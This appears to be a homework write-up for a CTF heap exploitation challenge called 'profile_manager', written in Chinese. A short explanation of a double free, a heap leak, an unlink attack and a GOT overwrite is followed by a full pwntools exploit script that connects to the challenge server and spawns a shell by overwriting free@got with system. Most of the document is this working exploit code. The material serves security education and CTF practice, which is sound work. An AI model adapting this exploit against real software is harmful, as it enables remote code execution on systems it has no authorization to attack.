# Software Security Hw04 - profile_manager

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
FORTIFY:  Enabled
```

這題在 ```edit_profile()``` 內可以做到double free 並可偽造一份 fake fastbin chunk, 另外也可利用fastbin的特性利用```show_profile()```leak出heap的位置

我們可以利用```malloc```的特性當 ```malloc(0x80) ~ malloc(0x88)``` glibc都會分配大小0x90的chunk, 可以改寫到連續記憶體中下個chunk的pre_size

再加上上面提到可以偽造一份fastbin chunk我們便可以做到改寫任一塊chunk的inused bit，到此為止我們就可以執行 unlink attack了。

之後就會發現目標```p[n].desc``` 此時已經指向```&(p[n-1].desc)```

我們就可以寫入got位置進行leak glibc的位置在改寫```free_got```為```system```的位置，達到拿取Shell

以下為解題script
```python
#!/usr/bin/env python

from pwn import *

#if args['reomte']:
r = remote('csie.ctf.tw', 10140)
#else:
#    r = process('./profile_manager')

def add_profile(name, age, size ,context):
    r.recvuntil(':')
    r.send("1")
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.sendline(str(age))
    r.recvuntil(':')
    r.send(str(size))
    r.recvuntil(':')
    r.send(context)

def show_profile(index):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.send(str(index))

def edit_profile(index, name, age, context):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(index))
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.sendline(str(age))
    r.recvuntil(':')
    r.send(context)

def del_profile(index):
    r.recvuntil(':')
    r.send('4')
    r.recvuntil(':')
    r.send(str(index))

def edit_profile_failed(index):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(index))
    r.recvuntil(':')
    r.send('\x00')


add_profile('0', 0x20, 0x98, '0'*143)
add_profile('1', 0x20, 0x98, '1'*0x88 + '\x20')


free_got = 0x602018
p3_desc = 0x602140

# overlap fastbin
edit_profile_failed(1)
edit_profile_failed(0)

show_profile(0)
r.recvuntil(':')
heap = u64(r.recvuntil('\n')[1:-1].ljust(8,'\x00')) -0xc0
r.recvuntil(':')
r.recvuntil(':')

print "heap", hex(heap)

edit_profile(1, p64(heap+0x218), 0x20, '1'*0x88 + '\x20')

add_profile('/bin/sh\x00', 0x20, 0x98, '0'*0x90 + '\x20')
add_profile('/bin/sh\x00', 0x20, 0x98, '0'*0x90 + '\x20')


add_profile( '\xa0' + '\x00', 0x20, 0x98, '0'*0x90)

edit_profile(2, '/bin/sh\x00', 0x20, p64(0x30) + p64(0x91) 
	+ p64(p3_desc-0x18) + p64(p3_desc-0x10) + '0'*0x70 + '\x90')

del_profile(3)

edit_profile(2, '/bin/sh\x00', 0x20, p64(free_got))
r.recvuntil(':')

show_profile(1)

r.recvuntil(':')
r.recvuntil(':')
r.recvuntil(':')
libc = u64(r.recvuntil('\n')[1:-1].ljust(8, '\x00')) - 0x0844f0
system = 0x0000000000045390
print "libc ", hex(libc)

edit_profile(1, '/bin/sh\x00', 0x20, p64(libc+system))

r.recvuntil(':')
del_profile(2)

r.interactive()






```